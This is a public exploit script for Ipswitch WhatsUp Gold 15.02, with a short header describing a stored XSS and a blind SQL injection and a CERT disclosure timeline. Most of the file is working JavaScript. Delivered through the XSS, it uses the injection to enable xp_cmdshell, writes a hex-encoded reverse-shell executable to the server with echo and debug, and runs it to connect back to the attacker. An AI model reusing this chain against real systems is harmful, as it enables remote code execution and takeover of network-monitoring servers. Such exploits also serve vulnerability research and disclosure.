/*
######################################################################################
# Exploit Title: Ipswitch WhatsUp Gold 15.02 Stored XSS - Blind SQLi - RCE
# Date: Jul 22 2012
# Author: muts
# Version: Ipswitch WhatsUp Gold 15.02
# Vendor URL: http://www.ipswitch.com/

An attacker can modify their snmpd.conf file with malicious JavaScript as follows:
sysName <script>alert(124)</script>pt>>

In addition, there is a Blind SQL Injection vulnerability in the file "WrVMwareHostList.asp". By sending a specially crafted malicious JavaScript payload, the SQLi can be exploited to add a new database administrator to the system, leading to remote code execution.

Blind SQLi Proof of Concept:
WrVMwareHostList.asp?sGroupList=1;WAITFOR DELAY '0:0:10'--&sDeviceList=3

The JavaScript code below will exploit the blind SQL injection vulnerability, enable
xp_cmdshell on the target, upload a reverse shell to the target, and execute it.

Timeline:

29 May 2012: Vulnerability reported to CERT
30 May 2012: Response received from CERT with disclosure date set to 20 Jul 2012
16 Jul 2012: Email received from Ipswitch stating that the issue will be fixed ASAP
22 Jul 2012: Public Disclosure

######################################################################################


*/

function getCookie(c_name)
{
	var i,x,y,ARRcookies=document.cookie.split(";");
	for (i=0;i<ARRcookies.length;i++)
	{
		x=ARRcookies[i].substr(0,ARRcookies[i].indexOf("="));
		y=ARRcookies[i].substr(ARRcookies[i].indexOf("=")+1);
		x=x.replace(/^\s+|\s+$/g,"");
		if (x==c_name)
		{
			return unescape(y);
		}
	}
}

function deleteCookie(c_name)
{
	setCookie(c_name, "", -1);
}

function setCookie(c_name,value,exdays)
{
	var exdate=new Date();
	exdate.setDate(exdate.getDate() + exdays);
	var c_value=escape(value) + ((exdays==null) ? "" : "; expires="+exdate.toUTCString());
	document.cookie=c_name + "=" + c_value;
}

function getHtmlBody(url)
{
	var xmlHttp = new XMLHttpRequest();
	xmlHttp.open('GET', url, false);
	xmlHttp.send(null);
	var results = xmlHttp.responseText;
	return(results);
}

var attackAnyway = 0;

// Check if a cookie has been set (this indicates we already exploited our target)
// Or if we decided to attack anyway (by setting 'attackAnyway')
if (getCookie("mix0") == undefined || attackAnyway == 1)
{
alert("woot, new attack");
alert(document.cookie);
setCookie("mix0", "1", 1);
alert(document.cookie);
alert("Debug - Enabling XP_CMDSHELL");


getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;DECLARE @S NVARCHAR(3000);SET @S=CAST(0x45005800450043002000730070005F0063006F006E0066006900670075007200650020002700730068006F007700200061006400760061006E0063006500640020006F007000740069006F006E00730027002C00200031003B005200450043004F004E004600490047005500520045003B0045005800450043002000730070005F0063006F006E0066006900670075007200650020002700780070005F0063006D0064007300680065006C006C0027002C00200031003B005200450043004F004E004600490047005500520045003B000A AS NVARCHAR(3000));Exec (@S);--&sDeviceList=3");

alert("Debug - Uploading Reverse Shell");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo n 1.dll >123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0100 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 4d 5a 90 00 03 00 00 00 04 00 00 00 ff ff 00 00 b8 00 00 00 00 00 00 00 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 b0 00 00 00 0e 1f ba 0e 00 b4 09 cd 21 b8 01 4c cd 21 54 68 69 73 20 70 72 6f 67 72 61 6d 20 63 61 6e 6e 6f 74 20 62 65 20 72 75 6e 20 69 6e 20 44 4f 53 20 6d 6f 64 65 2e 0d 0d 0a 24 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0180 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 5d cf 9f 87 19 ae f1 d4 19 ae f1 d4 19 ae f1 d4 97 b1 e2 d4 13 ae f1 d4 e5 8e e3 d4 18 ae f1 d4 52 69 63 68 19 ae f1 d4 00 00 00 00 00 00 00 00 50 45 00 00 4c 01 03 00 da 4d 03 50 00 00 00 00 00 00 00 00 e0 00 0f 01 0b 01 05 0c 00 02 00 00 00 06 00 00 00 00 00 00 00 10 00 00 00 10 00 00 00 20 00 00 00 00 40 00 00 10 00 00 00 02 00 00 04 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0200 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 40 00 00 00 04 00 00 00 00 00 00 02 00 00 00 00 00 10 00 00 10 00 00 00 00 10 00 00 10 00 00 00 00 00 00 10 00 00 00 00 00 00 00 00 00 00 00 1c 20 00 00 3c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0280 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 20 00 00 1c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 2e 74 65 78 74 00 00 00 b8 00 00 00 00 10 00 00 00 02 00 00 00 04 00 00 00 00 00 00 00 00 00 00 00 00 00 00 20 00 00 60 2e 72 64 61 74 61 00 00 d4 00 00 00 00 20 00 00 00 02 00 00 00 06 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 40 2e 64 61 74 61 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0300 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 02 02 00 00 00 30 00 00 00 02 00 00 00 08 00 00 00 00 00 00 00 00 00 00 00 00 00 00 40 00 00 c0 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0380 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0400 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0480 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0500 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 66 c7 05 9e 31 40 00 02 00 66 c7 05 a0 31 40 00 11 5c c7 05 a2 31 40 00 ac 10 a4 01 c7 05 ae 31 40 00 44 00 00 00 c7 05 da 31 40 00 00 01 00 00 68 10 30 40 00 68 01 01 00 00 e8 6d 00 00 00 6a 00 6a 00 6a 00 6a 06 6a 01 6a 02 e8 56 00 00 00 8b f8 6a 10 68 9e 31 40 00 57 e8 53 00 00 00 89 3d e6 31 40 00 89 3d ea 31 40 00 89 3d ee 31 40 00 68 f2 31 40 00 68 ae 31 40 00 6a 00 6a 00 6a  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0580 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 6a 01 6a 00 6a 00 68 00 30 40 00 6a 00 e8 07 00 00 00 6a 00 e8 06 00 00 00 ff 25 04 20 40 00 ff 25 00 20 40 00 ff 25 14 20 40 00 ff 25 0c 20 40 00 ff 25 10 20 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0600 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0680 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0700 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 86 20 00 00 74 20 00 00 00 00 00 00 b0 20 00 00 be 20 00 00 a2 20 00 00 00 00 00 00 58 20 00 00 00 00 00 00 00 00 00 00 94 20 00 00 00 20 00 00 64 20 00 00 00 00 00 00 00 00 00 00 c8 20 00 00 0c 20 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 86 20 00 00 74 20 00 00 00 00 00 00 b0 20 00 00 be 20 00 00 a2 20 00 00 00 00 00 00 4f 00 43 72 65 61 74 65 50 72 6f 63  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0780 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 65 73 73 41 00 00 9b 00 45 78 69 74 50 72 6f 63 65 73 73 00 6b 65 72 6e 65 6c 33 32 2e 64 6c 6c 00 00 41 00 57 53 41 53 6f 63 6b 65 74 41 00 00 43 00 57 53 41 53 74 61 72 74 75 70 00 00 56 00 63 6f 6e 6e 65 63 74 00 77 73 32 5f 33 32 2e 64 6c 6c 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0800 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0880 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0900 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 63 6d 64 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0980 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0a00 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0a80 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo e 0b00 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo  >>123.hex ';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo r cx >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo 0a00 >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo w >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'echo q >>123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'debug<123.hex';--");
getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'copy 1.dll shell.exe';--");


alert("Debug - Triggering Reverse Shell");

getHtmlBody("/NmConsole/Reports/Workspace/Virtualization/WrVMwareHostList/WrVMwareHostList.asp?sGroupList=1;EXEC xp_cmdshell 'shell.exe';--");
}
else
{
	alert("Victim Exploited - not running attack again");
	//deleteCookie("mix0");
}
